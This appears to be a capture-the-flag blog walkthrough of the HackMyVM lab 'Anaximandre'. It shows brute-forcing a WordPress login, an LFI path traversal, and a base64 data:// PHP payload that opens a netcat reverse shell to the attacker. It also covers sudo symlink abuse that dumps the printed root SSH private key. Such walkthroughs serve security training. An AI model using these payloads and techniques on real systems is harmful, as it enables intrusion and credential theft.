---
layout: post
title: "HackMyVM - Anaximandre"
date: 2022-12-14 00:00:00 +0100
categories: hmv
tag: ["WordPress", "LFI"]
---
# HackMyVM > Anaximandre

Creator: [cromiphi](https://hackmyvm.eu/profile/?user=cromiphi)
Level: Medium
Release Date: 2022-12-08

## Scan

### NMAP

```bash
# Nmap 7.93 scan initiated Wed Dec 21 19:49:04 2022 as: nmap -sC -sV -oA nmap/Anaximandre -p- 192.168.1.23
Nmap scan report for 192.168.1.23
Host is up (0.00039s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 ee71f4ada071e1351986abc8e6be3617 (RSA)
|   256 401cc3da83d72f60cb12473b02670414 (ECDSA)
|_  256 1a69a7f9dca549ffd27dce45976d8ab9 (ED25519)
80/tcp  open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-generator: WordPress 6.1.1
|_http-title: Geographia
873/tcp open  rsync   (protocol version 31)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 21 19:49:16 2022 -- 1 IP address (1 host up) scanned in 12.40 seconds
```

## Enumeration

### WPScan

```bash
$ wpscan --url "http://192.168.1.23"  --api-token TOKEN -P /usr/share/wordlists/rockyou.txt --detection-mode aggressive --plugins-detection aggressive -t 10
```

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]n
[+] URL: http://192.168.1.23/ [192.168.1.23]
[+] Started: Tue Dec 27 05:18:00 2022

Interesting Finding(s):

[+] XML-RPC seems to be enabled: http://192.168.1.23/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] Upload directory has listing enabled: http://192.168.1.23/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.1.23/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.1.1 identified (Latest, released on 2022-11-15).
 | Found By: Atom Generator (Aggressive Detection)
 |  - http://192.168.1.23/index.php/feed/atom/, <generator uri="https://wordpress.org/" version="6.1.1">WordPress</generator>
 | Confirmed By: Style Etag (Aggressive Detection)
 |  - http://192.168.1.23/wp-admin/load-styles.php, Match: '6.1.1'
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: WP <= 6.1.1 - Unauthenticated Blind SSRF via DNS Rebinding
 |     References:
 |      - https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590
 |      - https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:03:02 <=================================================================================> (101512 / 101512) 100.00% Time: 00:03:02
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.1.23/wp-content/plugins/akismet/
 | Last Updated: 2022-12-01T17:18:00.000Z
 | [[HackMyVM/Away/[[TryHackMe/Commited/[[HackTheBox/Precious/README|README]]|README]]|Readme]]: http://192.168.1.23/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.0.2
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.1.23/wp-content/plugins/akismet/, status: 200
 |
 | Version: 5.0.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.1.23/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.1.23/wp-content/plugins/akismet/readme.txt

[+] Enumerating Config Backups (via Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <========================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Enumerating Users (via Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=========================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] webmaster
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Performing password attack on Xmlrpc against 2 user/s
[SUCCESS] - webmaster / mickey                                                                                                                                         

[!] Valid Combinations Found:
 | Username: webmaster, Password: mickey

[+] WPScan DB API OKe1 Time: 00:06:24 <                                                                                       > (9479 / 28688884)  0.03%  ETA: ??:??:??
 | Plan: free
 | Requests Done (during the scan): 2
 | Requests Remaining: 73

[+] Finished: Tue Dec 27 05:27:57 2022
[+] Requests Done: 111195
[+] Cached Requests: 8
[+] Data Sent: 32.022 MB
[+] Data Received: 19.453 MB
[+] Memory used: 481.883 MB
[+] Elapsed time: 00:09:57
```

CREDENTIALS : webmaster : mickey

## WordPress Admin

<img src="https://drive.google.com/uc?id=1OXOcmcLUsxboro0i220NMQs8Q4NoqpWA"/>

INFO : Yn89m1RFBJ

## RSync

```bash
$ rsync rsync://192.168.1.23/share_rsync
drwxr-xr-x          4,096 2022/11/26 15:23:01 .
-rw-r-----         67,719 2022/11/26 15:19:33 access.log.cpt
-rw-r-----          4,206 2022/11/26 15:19:53 auth.log.cpt
-rw-r-----         45,772 2022/11/26 15:19:53 daemon.log.cpt
-rw-r--r--        229,920 2022/11/26 15:19:53 dpkg.log.cpt
-rw-r-----          4,593 2022/11/26 15:19:33 error.log.cpt
-rw-r-----         90,768 2022/11/26 15:19:53 kern.log.cpt
```

```bash
$ rsync rsync://192.168.1.23/share_rsync/access.log.cpt .

$ ccrypt -d access.log.cpt 
Enter decryption key: Yn89m1RFBJ
....
192.168.0.29 - - [26/Nov/2022:16:14:57 +0100] "GET /favicon.ico HTTP/1.1" 200 3962 "http://lovegeografia.anaximandre.hmv/init/index.php?home=" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
192.168.0.29 - - [26/Nov/2022:16:15:38 +0100] "GET /exemplos/codemirror.php?&pagina=../../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1" 200 982 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
....
$ ccrypt -d auth.log.cpt
....
new user: name=chaz, UID=1001, GID=1001, home=/home/chaz, shell=/bin/bash, from=/dev/pts/0
....
```

INFO : Subdomain : lovegeografia.anaximandre.hmv
USER : chaz

## LFI

```html
http://lovegeografia.anaximandre.hmv/exemplos/codemirror.php?&pagina=../../../../../../../../../../../../../../../../../etc/passwd
```

```bash
$ echo -n "<?php system('nc -e /bin/bash 192.168.1.6 4444'); ?>" | base64
PD9waHAgc3lzdGVtKCduYyAtZSAvYmluL2Jhc2ggMTkyLjE2OC4xLjYgNDQ0NCcpOyA/Pg==
```

### REVERSE SHELL - (CVE-2022-32409)

```
http://lovegeografia.anaximandre.hmv/exemplos/codemirror.php?&pagina=data://text/plain;base64,PD9waHAgc3lzdGVtKCduYyAtZSAvYmluL2Jhc2ggMTkyLjE2OC4xLjYgNDQ0NCcpOyA/Pg==
```

```bash
$ nc -lvnp 4444     
listening on [any] 4444 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.23] 53684
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Priviledge Escalation

```bash
cat /etc/rsyncd.auth
chaz:alanamorrechazado
```

```bash
$ ssh chaz@192.168.1.23                                        
Linux anaximandre.hmv 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

chaz@anaximandre:~$ ls -la
total 28                                                                                                                                                                
drwxr-xr-x 3 chaz chaz 4096 Nov 27 16:45 .                                                                                                                              
drwxr-xr-x 3 root root 4096 Nov 26 16:47 ..
lrwxrwxrwx 1 root root    9 Nov 26 16:48 .bash_history -> /dev/null
-rw-r--r-- 1 chaz chaz  220 Nov 26 16:16 .bash_logout
-rw-r--r-- 1 chaz chaz 3526 Nov 26 16:16 .bashrc
-rw-r--r-- 1 chaz chaz  807 Nov 26 16:16 .profile
drwx------ 2 chaz chaz 4096 Nov 27 15:54 .ssh
-rwx------ 1 chaz chaz   33 Nov 26 16:48 user.txt
```

## ROOT

```bash
chaz@anaximandre:~$ sudo -l
Matching Defaults entries for chaz on anaximandre:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User chaz may run the following commands on anaximandre:
    (ALL : ALL) NOPASSWD: /usr/bin/cat /home/chaz/*

```

### Soft Link

```bash
chaz@anaximandre:~$ ln -s /root/.ssh/id_rsa .
chaz@anaximandre:~$ ls -la
total 28
drwxr-xr-x 3 chaz chaz 4096 Dec 27 07:00 .
drwxr-xr-x 3 root root 4096 Nov 26 16:47 ..
lrwxrwxrwx 1 root root    9 Nov 26 16:48 .bash_history -> /dev/null
-rw-r--r-- 1 chaz chaz  220 Nov 26 16:16 .bash_logout
-rw-r--r-- 1 chaz chaz 3526 Nov 26 16:16 .bashrc
lrwxrwxrwx 1 chaz chaz   17 Dec 27 07:00 id_rsa -> /root/.ssh/id_rsa
-rw-r--r-- 1 chaz chaz  807 Nov 26 16:16 .profile
drwx------ 2 chaz chaz 4096 Nov 27 15:54 .ssh
-rwx------ 1 chaz chaz   33 Nov 26 16:48 user.txt

chaz@anaximandre:~$ sudo cat /home/chaz/*
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```bash
$ chmod 0400 root.key                  

$ ssh -i root.key root@192.168.1.23                                                                                                          
Linux anaximandre.hmv 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Nov 27 16:44:45 2022 from 192.168.0.29

root@anaximandre:~# 
```

